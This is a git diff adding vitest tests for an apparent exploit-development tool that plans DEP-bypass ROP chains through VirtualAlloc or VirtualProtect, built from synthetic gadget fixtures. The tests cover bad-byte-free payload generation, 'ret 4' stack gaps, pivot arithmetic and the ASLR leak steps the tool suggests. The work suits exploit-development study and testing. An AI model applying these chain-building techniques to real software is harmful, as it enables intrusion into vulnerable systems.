@@ -1,6 +1,8 @@
 import { describe, expect, test } from "vitest";
 import { ReachIndex } from "../src/rop/reach";
-import { commands, GADGETS, load, logs, syncBreeze, text, without, type Module } from "./helpers/fixture_process";
+import { spawnSync } from "node:child_process";
+import { measureLanding } from "../src/commands/dep_build";
+import { commands, crashOf, GADGETS, load, logs, syncBreeze, text, without, type Crash, type Module } from "./helpers/fixture_process";
 
 // dep_plan from evidence alone: which modules can give gadgets, where the API's address comes from, which
 // style the corpus supports, and whether a chain is needed at all. Each process here is built from real PE
@@ -179,6 +181,23 @@ describe("dep_plan, reproduced Sync Breeze shape", () => {
   });
 });
 
+describe("dep_plan on a target with nothing at a fixed base", () => {
+  test("the refusal names the leak as the missing piece and the command that starts it", () => {
+    const api = load([
+      { name: "tilecast.exe", base: 0x00b40000, aslr: true, nx: true, code: GADGETS },
+      { name: "KERNEL32.DLL", base: 0x75310000, aslr: true, nx: true },
+    ], { policy: 3 });
+    api.dep_plan("00");
+    const output = text();
+    const stop = output.slice(output.lastIndexOf("=== STOP"));
+    expect(stop).toContain("[-] The module layer fails: no loaded module can give gadgets: every one has ASLR.");
+    expect(stop).toContain("[-] The missing piece is a leak: one pointer the target sends back, minus its RVA, is the base of a module with ASLR.");
+    expect(stop).toContain("dx @$osed().leak.scan(@esp, 0x400)");
+    expect(stop).toContain("dx @$osed().leak.base(<pointer>, <rva>)");
+    expect(api.last_result().errors).toContain("Start at the crash: dx @$osed().leak.scan(@esp, 0x400) lists the pointers on the stack, each with its module and RVA.");
+  });
+});
+
 describe("dep_plan asks first whether a chain is needed", () => {
   const vuln = (nx: boolean): Module[] => [
     { name: "vuln.exe", base: 0x00400000, nx },
@@ -308,5 +327,151 @@ describe("palette", () => {
     const api = load([{ name: "libbkup.dll", base: 0x22220000, code: [[0x1000, fill], [0x2051, [0x5a, 0xc3]]] }]);
     api.palette("libbkup", bad);
     expect(entry(blockOf(text()), "GADGET_POP_EDX")).toBe("GADGET_POP_EDX = 0x22222051   # pop edx ; ret");
+  });
+});
+
+
+// What the target receives, not what the blocks say: the pasted file's payload function is called with the
+// shellcode hole filled, and the bytes it returns are read. The skeleton pivot once sent neg(-20), which is
+// 0x00000014, three null bytes the string copy stopped at.
+describe("dep_plan builds what it sends", () => {
+  const PYTHON = process.env.PYTHON ?? "python";
+  const HAS_PYTHON = spawnSync(PYTHON, ["--version"]).status === 0;
+  const BAD = [0x00, 0x0a, 0x0d];
+  // mov eax, edi ; ret, so the skeleton's pivot can take the field address. No pop takes 0x14 cleanly.
+  const MOV_EAX_EDI: [number, number[]] = [0x1391, [0x89, 0xf8, 0xc3]];
+  // xchg eax, ebx, edx and ecx, so the pushad constants built in eax reach their registers.
+  // sub eax, ecx ; ret too, since the distance to the sled is only clean subtracted.
+  const XCHG: Array<[number, number[]]> = [[0x13a1, [0x93, 0xc3]], [0x13b1, [0x92, 0xc3]], [0x13c1, [0x91, 0xc3]], [0x13d1, [0x29, 0xc8, 0xc3]]];
+  const vuln = (code: Array<[number, number[]]>): Module[] => [
+    { name: "vuln.exe", base: 0x00400000, nx: true },
+    { name: "libbkup.dll", base: 0x11110000, code, imports: [{ dll: "KERNEL32.dll", symbol: "VirtualAlloc", target: 0x11111121 }] },
+  ];
+  const blocks = (output: string): string[][] => output.split("# ------------------ copy into your exploit ------------------\n").slice(1)
+    .map((part) => part.split("\n=== ")[0].split("\n").filter((line) => !line.startsWith("[")));
+  const send = (output: string, offset: number): { sent: Buffer; error: string } => {
+    const file = [`OFFSET = ${offset}`, 'BADCHARS = b"\\x00\\x0a\\x0d"', ...blocks(output).flat(), "import sys",
+      "sys.stdout.write(payload1().hex())"].join("\n").replace('shellcode = hole("shellcode")', 'shellcode = b"\\xcc" * 8');
+    const run = spawnSync(PYTHON, ["-I", "-"], { input: file, encoding: "utf-8", timeout: 4000 });
+    return { sent: Buffer.from(run.stdout.trim(), "hex"), error: run.stderr.trim() };
+  };
+  const plan = (style: string, code: Array<[number, number[]]> = [...GADGETS, MOV_EAX_EDI, ...XCHG], crash?: Crash): string => {
+    load(vuln(code), { policy: 2, registry: "", crash });
+    (globalThis as unknown as { osed: { dep_plan: (...args: unknown[]) => unknown } }).osed.dep_plan("VirtualAlloc", "libbkup", "00 0A 0D", style);
+    return text();
+  };
+
+  test.skipIf(!HAS_PYTHON).each(["skeleton", "pushad"])("the %s payload carries no bad byte", (style) => {
+    const output = plan(style);
+    expect(output, style).toContain("1 hole(s) to fill, each a hole(...) line with the reason in the comment above it:\n[+]   shellcode: msfvenom");
+    const { sent, error } = send(output, 516);
+    expect(error, style).toBe("");
+    expect(sent.length).toBeGreaterThan(516);
+    for (const bad of BAD) expect(sent.indexOf(bad), `${style}: 0x${bad.toString(16)} at ${sent.indexOf(bad)}`).toBe(-1);
+  });
+
+  test("the skeleton pivot's distance is built when the pop would send a bad byte", () => {
+    const pivot = section(plan("skeleton"), "=== [7/7]");
+    expect(pivot).not.toMatch(/c\.rop\(POP_ECX, 0x00000014\)|neg\(-20\)/);
+    expect(pivot).toMatch(/# eax -= 0x00000014 for the pivot: ecx = 0xFFFFFFEC, then add/);
+  });
+
+  test("a distance no route can build becomes a hole that names it, never a dword sent", () => {
+    // No add or sub into any register, so no pivot distance can be built at all.
+    const output = plan("skeleton", [...without(0x1361, 0x1151), MOV_EAX_EDI]);
+    expect(section(output, "=== [7/7]")).toContain("pivot_value: no add or sub of a register into eax whose distance the search can load");
+  });
+
+  test.skipIf(!HAS_PYTHON)("a ret 4 is read off the crash, written into [6/7], and the payload puts the chain where ESP lands", () => {
+    const output = plan("pushad", undefined, crashOf(516, 4));
+    const frame = section(output, "=== [6/7]");
+    expect(frame).toContain("ESP after the crashing ret: EIP 0x42424242 sits at ESP-8, so the ret moved ESP 4 bytes past it (dds esp-8 L2).");
+    expect(frame).toContain("The chain's second dword sits at OFFSET + 8: RET_GAP puts 4 junk bytes after the first gadget.");
+    expect(frame).toContain("RET_GAP = 4");
+    const { sent, error } = send(output, 516);
+    expect(error).toBe("");
+    // The first gadget fills EIP, four junk bytes follow, and the second gadget sits where ESP points.
+    const plain = send(plan("pushad", undefined, crashOf(516, 0)), 516).sent;
+    expect(sent.subarray(516, 520)).toEqual(plain.subarray(516, 520));
+    expect(sent.subarray(520, 524)).toEqual(Buffer.from("AAAA"));
+    expect(sent.subarray(524, 528)).toEqual(plain.subarray(520, 524));
+  });
+
+  test("the gap is the distance from the EIP dword to ESP, and an input that cannot show it says so", () => {
+    const stack = (crash: Crash) => (address: number): number | undefined => {
+      const at = address - crash.stack.base;
+      return at >= 0 && at + 4 <= crash.stack.bytes.length ? new DataView(crash.stack.bytes.buffer).getUint32(at, true) : undefined;
+    };
+    for (const gap of [0, 4, 8, 0x10]) {
+      const crash = crashOf(516, gap);
+      expect(measureLanding(crash.eip, crash.esp, stack(crash))).toMatchObject({ gap, measured: true });
+    }
+    const flat = crashOf(516, 0);
+    flat.stack.bytes.fill(0x41);
+    expect(measureLanding(0x41414141, flat.esp, stack(flat))).toMatchObject({ gap: 0, measured: false });
+    expect(measureLanding(undefined, undefined, () => undefined).how).toContain("not measured, no registers to read");
+  });
+
+  // wbcore.dll's shape: the captured ESP's only add is `add esi, esi`, and the value register has no sub.
+  const ADD_ESI_ESI: [number, number[]] = [0x13f1, [0x01, 0xf6, 0xc3]];
+  const ADD_EDI_ECX: [number, number[]] = [0x1401, [0x01, 0xcf, 0xc3]];
+  const SUB_EDX_ECX: [number, number[]] = [0x1411, [0x29, 0xca, 0xc3]];
+  const MOV_EDX_EDI: [number, number[]] = [0x1421, [0x89, 0xfa, 0xc3]];
+  const MOV_EAX_EDX: [number, number[]] = [0x1431, [0x89, 0xd0, 0xc3]];
+
+  test.skipIf(!HAS_PYTHON)("a register added to itself is no distance: it goes onto the copy, and the sled distance is worked out elsewhere", () => {
+    const output = plan("skeleton", [...without(0x1151, 0x1361), ADD_ESI_ESI, ADD_EDI_ECX, MOV_EAX_EDI, SUB_EDX_ECX, MOV_EDX_EDI, MOV_EAX_EDX, ...XCHG.slice(0, 3)]);
+    const jobs = section(output, "=== [4/7]");
+    expect(jobs).toContain("no: adds esi to itself, which doubles it and adds no distance");
+    const chain = section(output, "=== [7/7]");
+    expect(chain).toMatch(/c\.rop\(MOV_EDI_ESI\)\n {4}# edi -= 0x0000001C for field 1: ecx = 0xFFFFFFE4, then add\n {4}c\.rop\(POP_ECX, 0xFFFFFFE4\)/);
+    expect(section(output, "=== [5/7]")).toMatch(/def load_return\(c, field\):[^\n]*\n {4}c\.rop\(MOV_EDX_EDI\)\n[^\n]*\n {4}c\.rop\(POP_ECX, 0\)\n {4}c\.rop\(SUB_EDX_ECX\)\n {4}c\.rop\(MOV_EAX_EDX\)/);
+    expect(output).toContain("1 hole(s) to fill");
+    const { sent, error } = send(output, 516);
+    expect(error).toBe("");
+    for (const bad of BAD) expect(sent.indexOf(bad), `0x${bad.toString(16)}`).toBe(-1);
+  });
+});
+
+// The method layer once matched each job to one named gadget, so a module whose only copy was
+// `push esi ; pop edi ; ret` was refused, and VirtualProtect was refused for lacking a negate only
+// VirtualAlloc's frame uses. A job is now met by any sequence that does it, and only the API's own jobs count.
+describe("dep_plan asks of the method only what the API needs, done by any sequence", () => {
+  const vuln = (code: Array<[number, number[]]>, api = "VirtualAlloc"): Module[] => [
+    { name: "vuln.exe", base: 0x00400000, nx: true },
+    { name: "libbkup.dll", base: 0x11110000, code, imports: [{ dll: "KERNEL32.dll", symbol: api, target: 0x11111121 }] },
+  ];
+  const MOV_EAX_EDI: [number, number[]] = [0x1391, [0x89, 0xf8, 0xc3]];
+  const SUB_EAX_ECX: [number, number[]] = [0x13d1, [0x29, 0xc8, 0xc3]];
+  const PUSH_ESI_POP_EDI: [number, number[]] = [0x13e1, [0x56, 0x5f, 0xc3]];
+  const XCHG_EAX_ECX: [number, number[]] = [0x13c1, [0x91, 0xc3]];
+  const run = (code: Array<[number, number[]]>, api: string, style: string): string => {
+    const osed = load(vuln(code, api), { policy: 2, registry: "" });
+    osed.dep_plan(api, "libbkup", "00 0A 0D", style);
+    return text();
+  };
+
+  test("a copy done by a push and a pop meets the copy job, and the chain uses it", () => {
+    const output = run([...without(0x1331), MOV_EAX_EDI, SUB_EAX_ECX, PUSH_ESI_POP_EDI], "VirtualAlloc", "skeleton");
+    expect(section(output, "=== [4/7]")).toContain("    no single gadget does it, a sequence does: esi into edi by push esi ; pop edi ; ret");
+    expect(output).not.toContain("The method layer fails");
+    const chain = section(output, "=== [7/7]");
+    expect(chain).toContain("1 hole(s) to fill");
+    expect(chain).toMatch(/c\.rop\(ADD_ESI_ECX\)\n {4}c\.rop\(PUSH_ESI_POP_EDI\)/);
+  });
+
+  test("with no negate, VirtualProtect's skeleton is complete while VirtualAlloc's lacks it", () => {
+    const code = [...without(0x1161), MOV_EAX_EDI, SUB_EAX_ECX];
+    const vp = run(code, "VirtualProtect", "skeleton");
+    expect(section(vp, "=== [4/7]")).not.toContain("  negate");
+    expect(vp).not.toContain("No gadget in libbkup.dll for");
+    const va = run(code, "VirtualAlloc", "skeleton");
+    expect(va).toContain("No gadget in libbkup.dll for: negate.");
+  });
+
+  test("with no pop eax, a pop ecx and an xchg load EAX, and the pushad style is not refused for it", () => {
+    const output = run([...without(0x1271), XCHG_EAX_ECX], "VirtualProtect", "pushad");
+    expect(section(output, "=== [4/7]")).toMatch(/pop eax: no single gadget does it, a sequence does: the chain into eax by pop ecx ; ret, then xchg (eax, ecx|ecx, eax) ; ret/);
+    expect(output).not.toMatch(/No gadget in libbkup.dll for: [^\n]*pop eax/);
   });
 });
